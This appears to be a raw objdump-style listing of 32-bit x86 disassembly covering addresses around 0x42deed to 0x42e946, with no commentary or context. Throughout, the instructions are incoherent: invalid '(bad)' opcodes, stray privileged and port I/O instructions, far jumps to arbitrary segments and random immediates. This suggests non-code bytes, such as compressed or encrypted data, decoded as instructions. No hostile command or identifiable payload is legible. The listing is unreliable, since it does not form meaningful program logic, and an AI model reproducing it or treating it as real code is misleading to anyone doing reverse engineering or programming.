  42deed:	jb     0x42deaa
  42deef:	or     edi,ebx
  42def1:	lods   al,BYTE PTR ds:[esi]
  42def2:	push   es
  42def3:	into   
  42def4:	mov    edi,0x2f5c3efd
  42def9:	call   0xdda8:0x3326baaa
  42df00:	out    0xfc,eax
  42df02:	push   edi
  42df03:	mov    esi,0xba382e67
  42df08:	inc    edx
  42df09:	pop    edx
  42df0a:	adc    BYTE PTR [esi],ch
  42df0c:	or     ebp,edx
  42df0e:	xor    al,0x25
  42df10:	ret    0x636
  42df13:	and    DWORD PTR [ebp+0x60],0x54
  42df17:	xor    ah,BYTE PTR [esi-0x39]
  42df1a:	bound  edx,QWORD PTR [ebx-0x301a36a2]
  42df20:	cld    
  42df21:	imul   DWORD PTR [ebx]
  42df23:	or     eax,0x807c8d9d
  42df28:	ins    DWORD PTR es:[edi],dx
  42df29:	inc    eax
  42df2a:	sbb    edx,DWORD PTR [edi+0x68d355f]
  42df30:	push   0x518592cc
  42df35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df36:	mov    esi,0xfb36a26
  42df3b:	inc    esi
  42df3c:	les    eax,FWORD PTR [esi+0x35]
  42df3f:	dec    esi
  42df40:	ret    0xe3fe
  42df43:	call   0xee30d50f
  42df48:	imul   ebp,edi,0x4798ea89
  42df4e:	loopne 0x42df39
  42df50:	mov    cl,al
  42df52:	xor    al,0xb7
  42df54:	push   eax
  42df55:	and    bl,BYTE PTR [esi-0x74]
  42df58:	pusha  
  42df59:	cmc    
  42df5a:	jl     0x42dee9
  42df5c:	jnp    0x42dfd7
  42df5e:	mov    WORD PTR [esi-0xa],gs
  42df61:	test   eax,0x282a58c3
  42df66:	pop    edx
  42df67:	jle    0x42dfe3
  42df69:	jo     0x42df58
  42df6b:	sahf   
  42df6c:	mov    ebp,0x1d7120f6
  42df71:	add    al,0x27
  42df73:	popf   
  42df74:	adc    eax,0xb0f531fc
  42df79:	jne    0x42df48
  42df7b:	popf   
  42df7c:	idiv   DWORD PTR [eax+0x16]
  42df7f:	and    ecx,esp
  42df81:	inc    ebp
  42df82:	xor    ah,BYTE PTR [eax+eiz*2+0x7b6682c9]
  42df89:	sbb    BYTE PTR [edi],ch
  42df8b:	xor    DWORD PTR [esi],0xffffffe5
  42df8e:	inc    esi
  42df8f:	dec    eax
  42df90:	ror    esp,0x80
  42df93:	fmul   st(4),st
  42df95:	jp     0x42df46
  42df97:	dec    esp
  42df98:	pop    ebp
  42df99:	shl    DWORD PTR [edx],cl
  42df9b:	xchg   ebp,eax
  42df9c:	jg     0x42dfb8
  42df9e:	and    eax,DWORD PTR [esi-0x4dd82fc5]
  42dfa4:	fild   DWORD PTR [ecx-0x12]
  42dfa7:	adc    al,0x7c
  42dfa9:	push   esi
  42dfaa:	mov    ecx,DWORD PTR [esi-0x7b27ffc0]
  42dfb0:	mov    al,0x77
  42dfb2:	adc    DWORD PTR [ebx],esp
  42dfb4:	vpacksswb ymm2,ymm0,YMMWORD PTR [ecx+0x39203b32]
  42dfbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dfbd:	jae    0x42dfc9
  42dfbf:	mov    ds:0xca36,al
	...
  42e034:	push   eax
  42e035:	cmp    al,dh
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx-0xd0a641e],0xa9
  42e044:	adc    al,0xe7
  42e046:	add    DWORD PTR [eax],eax
  42e048:	test   BYTE PTR [eax],0x0
  42e04b:	add    BYTE PTR [edx+0x619f9795],dl
  42e051:	and    bh,BYTE PTR [ebp-0x2e4507c2]
  42e057:	xlat   BYTE PTR ds:[ebx]
  42e058:	call   0xb5436e7f
  42e05d:	pop    ecx
  42e05e:	sub    eax,0x33224897
  42e063:	push   0xa6f16ca7
  42e068:	and    ecx,esp
  42e06a:	arpl   WORD PTR [ebx],di
  42e06c:	fstp   DWORD PTR [ebx-0x6a32cdc2]
  42e072:	cmc    
  42e073:	mov    bl,0xf5
  42e075:	and    BYTE PTR [ebp+eiz*4-0x2a],bl
  42e079:	mov    eax,0xebc669b6
  42e07e:	ds icebp 
  42e080:	sahf   
  42e081:	clc    
  42e082:	sub    eax,0xc8ed7848
  42e087:	pop    esi
  42e088:	aam    0xff
  42e08a:	and    BYTE PTR [ecx+0x13],ah
  42e08d:	inc    ebp
  42e08e:	cdq    
  42e08f:	cmc    
  42e090:	adc    edx,DWORD PTR [edi]
  42e092:	lods   eax,DWORD PTR ds:[esi]
  42e093:	push   esi
  42e094:	cli    
  42e095:	mov    eax,ds:0x1ff7368f
  42e09a:	int3   
  42e09b:	push   0x5134895d
  42e0a0:	mov    edx,0xfbe78fb
  42e0a5:	sbb    ah,cl
  42e0a7:	jno    0x42e08b
  42e0a9:	inc    edi
  42e0aa:	sub    bl,BYTE PTR [edx+0x51]
  42e0ad:	dec    edx
  42e0ae:	cmp    eax,0x82cf55b0
  42e0b3:	arpl   WORD PTR [ebp+0x53],ax
  42e0b6:	mov    dh,0x41
  42e0b8:	mov    edx,0x67b1f9c2
  42e0bd:	mov    bh,0x36
  42e0bf:	push   esi
  42e0c0:	xchg   BYTE PTR [esp+ecx*2+0x5b],dl
  42e0c4:	push   eax
  42e0c5:	dec    ebx
  42e0c6:	sub    ah,dl
  42e0c8:	or     ebx,0xffffffee
  42e0cb:	std    
  42e0cc:	stos   BYTE PTR es:[edi],al
  42e0cd:	test   eax,0x6677f9a
  42e0d2:	xchg   esp,eax
  42e0d3:	loope  0x42e141
  42e0d5:	xor    al,0x7d
  42e0d7:	imul   esi,DWORD PTR [ecx],0x1d
  42e0da:	addr16 das 
  42e0dc:	xor    eax,0x904fa3c2
  42e0e1:	ins    DWORD PTR es:[edi],dx
  42e0e2:	mov    WORD PTR [edi-0x1b50b292],ss
  42e0e8:	iret   
  42e0e9:	sub    eax,0x90b2edbd
  42e0ee:	stos   DWORD PTR es:[edi],eax
  42e0ef:	daa    
  42e0f0:	mov    ah,0x53
  42e0f2:	lods   al,BYTE PTR ds:[esi]
  42e0f3:	mov    ds:0x8a645a6b,eax
  42e0f8:	and    ecx,DWORD PTR [eax]
  42e0fa:	std    
  42e0fb:	ror    BYTE PTR [eax],1
  42e0fd:	mov    WORD PTR [ecx],ds
  42e0ff:	sub    al,0x24
  42e101:	and    cl,BYTE PTR [ebp-0x18]
  42e104:	ja     0x42e167
  42e106:	ja     0x42e088
  42e108:	push   ebp
  42e109:	in     eax,dx
  42e10a:	and    eax,0xfbd71f3b
  42e10f:	pop    ss
  42e110:	cmp    BYTE PTR [esi],bh
  42e112:	pop    edi
  42e113:	mov    ah,0xa6
  42e115:	ins    BYTE PTR es:[edi],dx
  42e116:	adc    cl,BYTE PTR [edx+0x12ea8c0]
  42e11c:	inc    esp
  42e11d:	rcl    DWORD PTR [ebx+0x42327401],cl
  42e123:	mov    esi,0x7537e591
  42e128:	(bad)  
  42e129:	lock dec esi
  42e12b:	pop    edi
  42e12c:	sahf   
  42e12d:	pop    esi
  42e12e:	idiv   BYTE PTR [esi+0x57dc96aa]
  42e134:	dec    esi
  42e135:	xor    BYTE PTR [esi],dl
  42e137:	jbe    0x42e105
  42e139:	loope  0x42e151
  42e13b:	cmp    eax,0x65f69e3a
  42e140:	or     DWORD PTR [eax+0x0],0x0
	...
  42e1b3:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0x490b2971
  42e1c3:	push   eax
  42e1c4:	or     ch,al
  42e1c6:	add    DWORD PTR [eax],eax
  42e1c8:	test   BYTE PTR [eax],0x0
  42e1cb:	add    BYTE PTR [eax-0x40],dh
  42e1ce:	fisttp QWORD PTR [ebp-0x2b]
  42e1d3:	adc    eax,0x4b8a0f98
  42e1d8:	add    eax,0x76aa5c8c
  42e1dd:	jns    0x42e25b
  42e1df:	out    dx,eax
  42e1e0:	fisub  WORD PTR [edx+edi*1]
  42e1e3:	pop    eax
  42e1e4:	lea    edx,[edx+0x3c]
  42e1e7:	cdq    
  42e1e8:	xor    al,0x25
  42e1ea:	push   ss
  42e1eb:	cmp    ecx,ebx
  42e1ed:	in     al,dx
  42e1ee:	das    
  42e1ef:	daa    
  42e1f0:	push   edx
  42e1f1:	pusha  
  42e1f2:	mov    ebx,0x1afc47fc
  42e1f7:	cdq    
  42e1f8:	push   edx
  42e1f9:	shl    DWORD PTR ds:0xe053a942,0x3e
  42e200:	xor    ah,ah
  42e202:	cmc    
  42e203:	jle    0x42e23a
  42e205:	jle    0x42e204
  42e207:	sbb    eax,0x7ed333ad
  42e20c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e20d:	push   cs
  42e20e:	ficom  DWORD PTR [eax]
  42e210:	repnz fcmovnbe st,st(4)
  42e213:	icebp  
  42e214:	mov    al,0xc8
  42e216:	xchg   ebx,eax
  42e217:	mov    al,ds:0xebbaddeb
  42e21c:	hlt    
  42e21d:	aam    0x3c
  42e21f:	ss mov ebp,?
  42e222:	sbb    al,0x9d
  42e224:	xor    BYTE PTR [esi-0x50],ah
  42e227:	nop
  42e228:	jb     0x42e2a7
  42e22a:	push   ss
  42e22b:	sahf   
  42e22c:	push   ecx
  42e22d:	outs   dx,BYTE PTR ds:[esi]
  42e22e:	mov    eax,ds:0xbe76a302
  42e233:	aam    0xbe
  42e235:	or     BYTE PTR gs:[eax],0xfe
  42e239:	call   0xeb06b456
  42e23e:	inc    edx
  42e23f:	jp     0x42e221
  42e241:	lea    ebx,[edx+ecx*1-0x59]
  42e245:	mov    edx,0x29e5b4e2
  42e24a:	ins    DWORD PTR es:[edi],dx
  42e24b:	outs   dx,DWORD PTR ds:[esi]
  42e24c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e24d:	jecxz  0x42e26b
  42e24f:	iret   
  42e250:	xchg   esp,eax
  42e251:	jg     0x42e224
  42e253:	loop   0x42e278
  42e255:	fidivr DWORD PTR [edi+0x66bdb984]
  42e25b:	inc    eax
  42e25c:	or     al,0x27
  42e25e:	mov    eax,ds:0xdb459ebc
  42e263:	push   cs
  42e264:	rol    BYTE PTR ds:0x229fae47,1
  42e26a:	call   0x3a38a454
  42e26f:	scas   eax,DWORD PTR es:[edi]
  42e270:	sahf   
  42e271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e272:	gs sti 
  42e274:	pop    edi
  42e275:	jb     0x42e2e5
  42e277:	fdivrp st(3),st
  42e279:	sti    
  42e27a:	in     al,0xce
  42e27c:	aam    0xe7
  42e27e:	(bad)  
  42e27f:	imul   edx,DWORD PTR [ecx],0x4a
  42e282:	sbb    bl,BYTE PTR [ecx+0x2a]
  42e285:	jmp    0x39f4b35b
  42e28a:	pop    ss
  42e28b:	sbb    al,0xae
  42e28d:	pushf  
  42e28e:	jle    0x42e2c2
  42e290:	(bad)  [ebx+0x24]
  42e293:	inc    esi
  42e294:	rep stos BYTE PTR es:[edi],al
  42e296:	lahf   
  42e297:	ret    0x192b
  42e29a:	push   eax
  42e29b:	(bad)  
  42e29c:	into   
  42e29d:	stc    
  42e29e:	rcr    DWORD PTR [ecx-0xd],0x9b
  42e2a2:	stos   DWORD PTR es:[edi],eax
  42e2a3:	jmp    0xfbc588ce
  42e2a8:	jmp    0x42e2e0
  42e2aa:	mov    al,0x5a
  42e2ac:	fimul  WORD PTR [ebx+0x58275a65]
  42e2b2:	loop   0x42e270
  42e2b4:	outs   dx,BYTE PTR ds:[esi]
  42e2b5:	inc    BYTE PTR [edx]
  42e2b7:	fcmovne st,st(2)
  42e2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e2ba:	repnz xchg esp,eax
  42e2bc:	arpl   WORD PTR [edx+0x64dce477],ax
	...
  42e332:	add    BYTE PTR [eax],al
  42e334:	ror    esi,0x63
  42e337:	cdq    
  42e338:	outs   dx,DWORD PTR ds:[esi]
  42e339:	mov    ebp,0x5146defb
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [ecx],ecx
  42e341:	enter  0xb4df,0x0
  42e345:	jmp    0x138e34b
  42e34a:	add    BYTE PTR [eax],al
  42e34c:	addr16 (bad) 
  42e34f:	jns    0x42e2e8
  42e351:	pushf  
  42e352:	mov    eax,ds:0xf74e347e
  42e357:	das    
  42e358:	stos   BYTE PTR es:[edi],al
  42e359:	dec    eax
  42e35a:	sbb    dl,BYTE PTR [edi+0xa]
  42e35d:	add    ah,BYTE PTR [ecx-0x2e]
  42e360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e361:	mov    edx,0x37d2cd0a
  42e366:	cli    
  42e367:	in     al,0xb3
  42e369:	lock or eax,0x31714fb1
  42e36f:	and    cl,BYTE PTR [edi]
  42e371:	(bad)  
  42e372:	in     al,dx
  42e373:	getsec 
  42e375:	pop    esp
  42e376:	mov    eax,0x92da6c8
  42e37b:	(bad)  
  42e37c:	out    0x1d,eax
  42e37e:	sub    eax,0x56a22653
  42e383:	sbb    eax,0x36e28a48
  42e388:	aad    0xd5
  42e38a:	pushf  
  42e38b:	das    
  42e38c:	adc    DWORD PTR [ecx],esi
  42e38e:	sub    DWORD PTR [edi],eax
  42e390:	add    eax,0x24579f82
  42e395:	int    0x6f
  42e397:	jle    0x42e3e2
  42e399:	lods   al,BYTE PTR ds:[esi]
  42e39a:	dec    edi
  42e39b:	jno    0x42e395
  42e39d:	mov    WORD PTR [edx-0x321c036d],ds
  42e3a3:	sahf   
  42e3a4:	(bad)  
  42e3a5:	popa   
  42e3a6:	xchg   ebp,eax
  42e3a7:	push   ebp
  42e3a8:	mov    bl,0x9f
  42e3aa:	push   esp
  42e3ab:	jmp    0xc3e1:0x8cdf82d1
  42e3b2:	cs daa 
  42e3b4:	sub    cl,cl
  42e3b6:	dec    edx
  42e3b7:	ret    
  42e3b8:	popa   
  42e3b9:	mov    ds:0x94e9ec5d,al
  42e3be:	sub    eax,0x1b35aa80
  42e3c3:	xchg   esi,eax
  42e3c4:	dec    esi
  42e3c5:	push   ecx
  42e3c6:	imul   BYTE PTR [ebx-0x396aff7c]
  42e3cc:	add    BYTE PTR [edi+0x1b],cl
  42e3cf:	jmp    0x1524:0x5571181b
  42e3d6:	dec    edx
  42e3d7:	lods   eax,DWORD PTR ds:[esi]
  42e3d8:	dec    ax
  42e3da:	xchg   esi,eax
  42e3db:	jp     0x42e382
  42e3dd:	mov    ds:0x35f1d941,al
  42e3e2:	nop
  42e3e3:	pop    ebp
  42e3e4:	ret    0x207e
  42e3e7:	sar    DWORD PTR [esi-0xe79d538],1
  42e3ed:	in     al,0x67
  42e3ef:	sub    dl,bh
  42e3f1:	aaa    
  42e3f2:	cmp    BYTE PTR [ecx+0xd],0x15
  42e3f6:	add    al,al
  42e3f8:	(bad)  
  42e3f9:	cwde   
  42e3fa:	popf   
  42e3fb:	aaa    
  42e3fc:	dec    esp
  42e3fd:	iret   
  42e3fe:	mov    bh,0xba
  42e400:	pop    es
  42e401:	call   0xb8d6:0x406a0ca2
  42e408:	ret    
  42e409:	dec    ebx
  42e40a:	test   ecx,ecx
  42e40c:	dec    edi
  42e40d:	mov    bl,0x96
  42e40f:	mov    fs,WORD PTR ds:0x73df0c49
  42e415:	je     0x42e42b
  42e417:	and    ch,dl
  42e419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e41a:	xlat   BYTE PTR ds:[ebx]
  42e41b:	xlat   BYTE PTR ds:[ebx]
  42e41c:	mov    dl,0xda
  42e41e:	outs   dx,BYTE PTR ds:[esi]
  42e41f:	sub    BYTE PTR [eax+0x6a33b2fb],0x5f
  42e426:	outs   dx,DWORD PTR ds:[esi]
  42e427:	push   eax
  42e428:	mov    ah,0xdc
  42e42a:	xchg   ah,cl
  42e42c:	or     DWORD PTR ds:0x55732bdd,eax
  42e432:	mov    ds:0x77d07400,eax
  42e437:	cmc    
  42e438:	xor    esp,eax
  42e43a:	ins    BYTE PTR es:[edi],dx
  42e43b:	clc    
  42e43c:	cmp    ecx,esp
  42e43e:	mov    WORD PTR [ebx+ecx*8],cs
  42e441:	and    al,0x0
	...
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0xff6a4be
  42e4c4:	imul   cl
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	test   BYTE PTR [eax],0x0
  42e4cb:	add    bh,bl
  42e4cd:	sub    al,0x3b
  42e4cf:	cmc    
  42e4d0:	sub    DWORD PTR [edx],esi
  42e4d2:	lock xchg BYTE PTR [edx+ecx*2+0x20502a30],dl
  42e4da:	lock sub DWORD PTR [ecx-0x5536676f],ecx
  42e4e1:	dec    ebp
  42e4e2:	xor    dl,BYTE PTR [edx+0x4ac6d241]
  42e4e8:	mov    esp,0x2c8e84aa
  42e4ed:	push   cs
  42e4ee:	cmp    BYTE PTR [ecx],ah
  42e4f0:	into   
  42e4f1:	sbb    eax,0x16550550
  42e4f6:	into   
  42e4f7:	iret   
  42e4f8:	push   0xb300847a
  42e4fd:	pushf  
  42e4fe:	add    dh,BYTE PTR [ecx+0x3ee035c1]
  42e504:	inc    eax
  42e505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e506:	shl    DWORD PTR [ebx+0x3c7cba6d],cl
  42e50c:	cmp    eax,0xf1f2fb13
  42e511:	jb     0x42e530
  42e513:	xor    dh,BYTE PTR [ebp-0x22]
  42e516:	int    0x31
  42e518:	pop    esi
  42e519:	ja     0x42e51a
  42e51b:	mov    BYTE PTR ds:0x6d80698,bh
  42e521:	add    ch,BYTE PTR ds:0x9fc6528a
  42e527:	adc    dl,BYTE PTR [ebp+0x2b275da2]
  42e52d:	mov    edi,0x64c888af
  42e532:	jne    0x42e4f6
  42e534:	jmp    0xf227:0x21e82038
  42e53b:	jb     0x42e533
  42e53d:	dec    edx
  42e53e:	mov    al,0xf4
  42e540:	dec    ebp
  42e541:	rol    BYTE PTR [edi+0x48],0xff
  42e545:	enter  0x7797,0xff
  42e549:	push   ds
  42e54a:	inc    esp
  42e54b:	push   es
  42e54c:	push   es
  42e54d:	sar    BYTE PTR [ebx-0x7b4a5d53],1
  42e553:	dec    edx
  42e554:	bound  ebx,QWORD PTR [edi-0x21]
  42e557:	mov    bh,0xbc
  42e559:	sti    
  42e55a:	push   0xffffffc7
  42e55c:	stos   DWORD PTR es:[edi],eax
  42e55d:	arpl   WORD PTR [edi+0xb],di
  42e560:	or     DWORD PTR [eax],edi
  42e562:	out    0xe4,al
  42e564:	neg    DWORD PTR [ecx-0x11d29a35]
  42e56a:	xchg   edx,eax
  42e56b:	mov    dl,0x64
  42e56d:	mov    edx,0xc323a0ee
  42e572:	and    DWORD PTR [ecx],ebp
  42e574:	dec    ebp
  42e575:	cmp    al,0xdf
  42e577:	mov    bh,0x7f
  42e579:	fistp  DWORD PTR [esp+ebx*8-0x10c8fb91]
  42e580:	into   
  42e581:	and    BYTE PTR [ebx+0x32],ch
  42e584:	loope  0x42e58f
  42e586:	sar    DWORD PTR [esi],1
  42e588:	mov    DWORD PTR [edx],eax
  42e58a:	jg     0x42e5ce
  42e58c:	push   ds
  42e58d:	adc    eax,ecx
  42e58f:	sbb    bl,BYTE PTR [ebx-0x26af1d74]
  42e595:	xor    BYTE PTR [ebx],ah
  42e597:	pop    ss
  42e598:	mov    ah,0xc
  42e59a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42e59c:	cdq    
  42e59d:	scas   eax,DWORD PTR es:[edi]
  42e59e:	imul   ebp,DWORD PTR [ecx],0x55
  42e5a1:	pusha  
  42e5a2:	mov    ebp,0x6cd64921
  42e5a7:	cli    
  42e5a8:	ja     0x42e5de
  42e5aa:	inc    ebx
  42e5ab:	dec    edx
  42e5ac:	mov    al,ds:0x9af2554b
  42e5b1:	int    0xd9
  42e5b3:	xor    al,0xed
  42e5b5:	push   edx
  42e5b6:	add    DWORD PTR [eax-0x70],ebx
  42e5b9:	jmp    0x8d138cae
  42e5be:	mov    bl,BYTE PTR [edi+ebp*4+0x12]
	...
  42e631:	add    BYTE PTR [eax],al
  42e633:	add    bl,dh
  42e635:	add    esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	and    eax,0xec7fb681
  42e645:	jmp    0x0:0xf60001
  42e64c:	push   edi
  42e64d:	or     al,0x6b
  42e64f:	dec    edx
  42e650:	adc    bl,BYTE PTR [eax]
  42e652:	(bad)  ss:[ebx+0x12]
  42e656:	or     BYTE PTR [ebp+edx*4-0x2ef7da11],bl
  42e65d:	retf   
  42e65e:	cmp    bl,BYTE PTR [esi+0x19de3b62]
  42e664:	adc    eax,0x9aadb87e
  42e669:	lods   al,BYTE PTR ds:[esi]
  42e66a:	ja     0x42e6e0
  42e66c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e66d:	inc    eax
  42e66e:	xlat   BYTE PTR ds:[ebx]
  42e66f:	mov    esp,0x7562d131
  42e674:	xor    dl,BYTE PTR [esi+0x50]
  42e677:	adc    dl,cl
  42e679:	sti    
  42e67a:	xchg   edx,eax
  42e67b:	neg    BYTE PTR [edi]
  42e67d:	pop    ebx
  42e67e:	jo     0x42e6ee
  42e680:	push   esp
  42e681:	mov    dh,0x6b
  42e683:	(bad)  
  42e684:	in     al,0xdc
  42e686:	mov    bl,0x57
  42e688:	neg    DWORD PTR [eax+0x5e]
  42e68b:	xor    bl,cl
  42e68d:	loope  0x42e64a
  42e68f:	(bad)  
  42e690:	jecxz  0x42e657
  42e692:	(bad)  
  42e693:	mov    edi,0x321e634d
  42e698:	xor    bl,BYTE PTR [eax-0x1bd72688]
  42e69e:	mov    BYTE PTR [edi],cl
  42e6a0:	out    0xa2,eax
  42e6a2:	pop    esi
  42e6a3:	jae    0x42e6d8
  42e6a5:	mov    ebx,0x20666749
  42e6aa:	sti    
  42e6ab:	or     BYTE PTR [eax+0x2b],al
  42e6ae:	cmp    eax,0xf78843e4
  42e6b3:	aaa    
  42e6b4:	cmp    dl,dl
  42e6b6:	mov    esp,0xec6f7709
  42e6bb:	div    dh
  42e6bd:	(bad)  
  42e6be:	mov    esp,0xfe6b2469
  42e6c3:	pop    ebp
  42e6c4:	add    edi,eax
  42e6c6:	ss and bh,cl
  42e6c9:	clc    
  42e6ca:	popa   
  42e6cb:	popa   
  42e6cc:	push   es
  42e6cd:	out    dx,eax
  42e6ce:	js     0x42e663
  42e6d0:	dec    edx
  42e6d1:	sbb    al,0x68
  42e6d3:	mov    ds:0x364c9f5d,eax
  42e6d8:	retf   0x82bf
  42e6db:	add    bh,ch
  42e6dd:	(bad)  
  42e6df:	loop   0x42e715
  42e6e1:	jl     0x42e6b3
  42e6e3:	sub    DWORD PTR [ebx],edi
  42e6e5:	xchg   DWORD PTR [edx],eax
  42e6e7:	test   DWORD PTR [ebx],0xc0922157
  42e6ed:	mov    esp,gs
  42e6ef:	retf   0xbb50
  42e6f2:	mov    ah,0x68
  42e6f4:	jge    0x42e676
  42e6f6:	push   ds
  42e6f7:	xchg   BYTE PTR [eax+0x4741bfdb],dl
  42e6fd:	iret   
  42e6fe:	pop    ebx
  42e6ff:	into   
  42e700:	loope  0x42e746
  42e702:	loope  0x42e69e
  42e704:	and    al,0xa5
  42e706:	sahf   
  42e707:	add    al,0x22
  42e709:	and    al,0x8f
  42e70b:	lods   eax,DWORD PTR ds:[esi]
  42e70c:	int3   
  42e70d:	adc    al,0x54
  42e70f:	dec    ecx
  42e710:	enter  0xabf8,0x8e
  42e714:	xor    DWORD PTR [edi],edx
  42e716:	xchg   edi,eax
  42e717:	je     0x42e70d
  42e719:	jmp    0x42e733
  42e71b:	xchg   edi,eax
  42e71c:	loope  0x42e6a1
  42e71e:	clc    
  42e71f:	push   cs
  42e720:	and    ebp,DWORD PTR [eax]
  42e722:	jmp    0x42e6b2
  42e724:	push   edx
  42e725:	dec    esp
  42e726:	imul   ebx,DWORD PTR [ebx-0x47ccc6b5],0xffffff85
  42e72d:	ja     0x42e732
  42e72f:	cs sub al,0x3b
  42e732:	ror    cl,0x1a
  42e735:	add    ah,al
  42e737:	push   ebp
  42e738:	push   es
  42e739:	jmp    0x182e5789
  42e73e:	popa   
  42e73f:	sbb    eax,0xabcc
	...
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi+0x6a0d5576]
  42e7c1:	scas   eax,DWORD PTR es:[edi]
  42e7c2:	in     eax,0xcc
  42e7c4:	loop   0x42e7b1
  42e7c6:	add    DWORD PTR [eax],eax
  42e7c8:	test   BYTE PTR [eax],0x0
  42e7cb:	add    BYTE PTR [esi-0x57],ch
  42e7ce:	push   DWORD PTR [ebx+0x25]
  42e7d1:	ins    DWORD PTR es:[edi],dx
  42e7d2:	cmp    eax,0x50f252ed
  42e7d7:	fs mov ecx,0x3680c66d
  42e7dd:	call   FWORD PTR [eax+0x72]
  42e7e0:	js     0x42e809
  42e7e2:	lods   al,BYTE PTR ds:[esi]
  42e7e3:	cmp    BYTE PTR [ebx-0x331bb257],cl
  42e7e9:	pop    esi
  42e7ea:	and    ebx,eax
  42e7ec:	xchg   BYTE PTR [edx+0xf],dh
  42e7ef:	push   eax
  42e7f0:	sub    cl,BYTE PTR [eax-0x3c]
  42e7f3:	scas   eax,DWORD PTR es:[edi]
  42e7f4:	lock rcr DWORD PTR [edx],0x1f
  42e7f8:	xor    eax,0x2de3632d
  42e7fd:	arpl   WORD PTR [ebp+0x48d38710],di
  42e803:	push   ebx
  42e804:	cmp    cl,BYTE PTR [ebx+ebp*8-0x71b92bea]
  42e80b:	mul    DWORD PTR [esi+ebx*4]
  42e80e:	sbb    BYTE PTR [esi+0x134591d5],0x72
  42e815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e816:	in     eax,dx
  42e817:	ret    
  42e818:	adc    ecx,DWORD PTR [edx]
  42e81a:	lods   eax,DWORD PTR ds:[esi]
  42e81b:	sub    eax,0xa02e301b
  42e820:	sbb    BYTE PTR [eax],dh
  42e822:	(bad)  
  42e823:	xor    DWORD PTR [ebx-0x11],eax
  42e826:	iret   
  42e827:	shr    DWORD PTR [ecx],0xea
  42e82a:	cmc    
  42e82b:	pop    ebx
  42e82c:	shl    BYTE PTR [edi-0x5f],1
  42e82f:	xor    ecx,eax
  42e831:	or     eax,0xd4020efe
  42e836:	adc    DWORD PTR [eax+0x35],ecx
  42e839:	inc    ebp
  42e83a:	into   
  42e83b:	inc    edi
  42e83c:	mov    ch,ah
  42e83e:	popf   
  42e83f:	cdq    
  42e840:	(bad)  
  42e841:	dec    BYTE PTR [esi+0x72]
  42e844:	dec    esp
  42e845:	mov    bl,0x8f
  42e847:	popf   
  42e848:	cli    
  42e849:	scas   eax,DWORD PTR es:[edi]
  42e84a:	ins    BYTE PTR es:[edi],dx
  42e84b:	retf   
  42e84c:	lahf   
  42e84d:	lods   eax,DWORD PTR ds:[esi]
  42e84e:	dec    eax
  42e84f:	les    eax,FWORD PTR [ecx-0x48]
  42e852:	cmp    ebp,DWORD PTR es:[ebx+0x141206e2]
  42e859:	xor    DWORD PTR [ebp+0x6de6f9a9],edx
  42e85f:	(bad)  
  42e860:	stos   BYTE PTR es:[edi],al
  42e861:	add    edi,DWORD PTR [edx+ecx*1+0x66]
  42e865:	es jmp 0x10de6f32
  42e86b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e86c:	pop    edx
  42e86d:	lahf   
  42e86e:	dec    esp
  42e86f:	aas    
  42e870:	mov    edx,0x87b90ec8
  42e875:	aad    0x99
  42e877:	or     BYTE PTR [esp+ebx*2],0x78
  42e87b:	hlt    
  42e87c:	out    dx,al
  42e87d:	dec    esi
  42e87e:	aaa    
  42e87f:	stos   BYTE PTR es:[edi],al
  42e880:	or     al,0xae
  42e882:	mov    BYTE PTR [edx-0x7d39167c],ch
  42e888:	inc    edi
  42e889:	adc    ebx,DWORD PTR [eax]
  42e88b:	mov    ebp,0xf3f795ec
  42e890:	and    cl,BYTE PTR [edx-0x2a]
  42e893:	add    esp,esi
  42e895:	ficomp DWORD PTR ds:0xf7d4f217
  42e89b:	das    
  42e89c:	pop    eax
  42e89d:	pop    ss
  42e89e:	mov    ss,WORD PTR [edi+0x5c]
  42e8a1:	popa   
  42e8a2:	fsubr  DWORD PTR [edi+ebp*8]
  42e8a5:	xor    al,0x6e
  42e8a7:	loope  0x42e8d4
  42e8a9:	dec    ebx
  42e8aa:	lock sbb eax,0xc05f6ce8
  42e8b0:	jmp    0x42e86f
  42e8b2:	and    BYTE PTR ds:0xde013c90,bl
  42e8b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e8ba:	aas    
  42e8bb:	arpl   WORD PTR [esi-0xe],bp
  42e8be:	cmc    
  42e8bf:	xor    eax,0x4c76
	...
  42e934:	stc    
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0x39
  42e941:	add    ecx,DWORD PTR [ebx+0x7]
  42e944:	fsubr  st,st(4)
  42e946:	add    DWORD PTR [eax],eax
